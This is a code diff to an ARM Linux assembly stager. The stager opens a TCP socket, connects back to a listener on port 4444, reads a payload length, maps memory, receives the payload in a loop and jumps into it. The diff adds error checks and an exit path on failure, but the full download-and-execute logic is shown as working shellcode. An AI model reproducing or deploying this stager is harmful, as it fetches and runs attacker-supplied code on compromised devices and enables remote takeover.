@@ -34,12 +34,16 @@ _start:
 	mov r1,#1          @ type     = SOCK_STREAM
 	mov r2,#6          @ protocol = IPPROTO_TCP
 	swi 0
+	cmp r0, #0
+	blt failed
 @ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
     mov r12,r0         @ sockfd
 	add r7,#2          @ __NR_socket
-	add r1,pc,#144     @ *addr
+	add r1,pc,#196     @ *addr
 	mov r2,#16         @ addrlen
 	swi 0
+	cmp r0, #0
+	blt failed
 @ ssize_t recv(int sockfd, void *buf, size_t len, int flags);
     mov r0,r12         @ sockfd
 	sub sp,#4
@@ -48,6 +52,8 @@ _start:
 	mov r2,#4          @ len
 	mov r3,#0          @ flags
 	swi 0
+	cmp r0, #0
+	blt failed
 @ round length
 	ldr r1,[sp,#0]
 	ldr r3,=0xfffff000
@@ -63,6 +69,8 @@ _start:
 	mov r4,r0          @ fd
 	mov r5,#0          @ pgoffset
 	swi 0
+	cmn r0, #1
+	beq failed
 @ recv loop
 @ ssize_t recv(int sockfd, void *buf, size_t len, int flags);
 	add r7,#99         @ __NR_recv
@@ -78,12 +86,20 @@ loop:
 	ble last
 	mov r2,#1000       @ len
 	swi 0	
+	cmp r0, #0
+	blt failed
 	b loop
 last:
 	add r2,#1000       @ len
 	swi 0
+	cmp r0, #0
+	blt failed
 @ branch to code
 	mov pc,r1
+failed:
+	mov r7, #1
+	mov r0, #1
+	swi 0
 @ addr
 @ port: 4444 , sin_fam = 2
 .word   0x5c110002 
